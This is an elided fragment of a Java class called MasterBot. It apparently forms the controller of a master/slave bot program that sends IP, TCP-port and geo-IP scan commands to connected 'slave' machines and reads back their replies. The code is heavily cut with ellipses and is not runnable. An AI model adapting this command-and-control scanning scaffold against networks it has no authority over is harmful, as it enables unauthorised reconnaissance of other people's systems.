...
public class MasterBot {
	...
	public static void main(String[] args) throws IOException {
		try {
			...
			System.out.println("geoipscan IPAddressOrHostNameOfYourSlave|all IPAddressRange");
		...
		while (!msout.equals("exit")) {
			...
			} else if (splited[0].equals("ipscan") || splited[0].equals("tcpportscan") || splited[0].equals("geoipscan")) {
				new Scan().start();
			} else {
				System.exit(-1);
			}
		...
		public void run() {
			...
			try {
				...
				for (int i = 0; i < ConnectionArray.size(); i++) {
				    ...
				    String strTemp;
				    while (!(strTemp = slaveResponse.readLine()).endsWith("\0")) {
